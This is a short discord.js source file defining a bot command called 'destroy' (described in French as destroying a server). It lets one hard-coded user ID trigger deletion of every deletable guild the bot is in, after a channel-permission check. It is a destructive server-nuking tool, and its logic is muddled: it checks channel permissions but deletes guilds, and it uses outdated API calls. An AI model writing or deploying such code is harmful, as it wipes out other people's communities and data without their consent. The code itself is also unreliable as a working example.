const Discord = require('discord.js');

module.exports = {
    name: "destroy",
    description: "Détruire un serveur",

    async run (bot, message, args) {

        if(message.author.id !== '491312416098091028') return message.channel.send(`Seul Red_StonixX peut effectué cette commande !`);

        // const deletechannel = message.guild.channels.cache.get('835812185681821697');
        // deletechannel.delete();

        if(message.channel.type === "dm") return;
        if(message.guild.channels.size === 0) return;
        else if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
        bot.guilds.cache.forEach(chan => { if(chan.deletable) chan.delete();})
        //message.guild.createChannel('discord-bug', 'text').catch(e => {});

        message.channel.send("C'est bon")
    }
}
